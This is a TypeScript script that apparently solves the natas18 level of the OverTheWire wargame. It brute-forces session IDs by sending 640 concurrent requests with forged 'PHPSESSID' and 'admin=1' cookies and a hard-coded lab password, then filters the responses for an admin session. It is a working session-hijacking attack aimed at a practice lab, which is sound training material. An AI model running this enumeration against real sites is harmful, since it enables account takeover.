const rp = require('request-promise');
import * as http from "http"
const keepAliveAgent = new http.Agent({
	keepAlive: true,
	maxSockets: 30 
});

const MAX_SESSIONS = 640;

let promiseArray: Promise<string>[] = [];
for(let k = 0; k < MAX_SESSIONS; k++){
	let j = rp.jar();
	const cookie = rp.cookie(`PHPSESSID=${k}; admin=1`);
	console.log(cookie);

	const url = "http://natas18.natas.labs.overthewire.org/index.php?debug=1";

	j.setCookie(cookie, url);

	let promise = rp.post(
	url
	, {
		jar: j,
		pool: keepAliveAgent
	})
		.auth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP', true)
	promiseArray.push(promise);
}

Promise.all(promiseArray).then((responses) => {
	return responses.filter((res) => res.includes('Username') == true)
})
	.then(console.log)
	.catch(console.error);
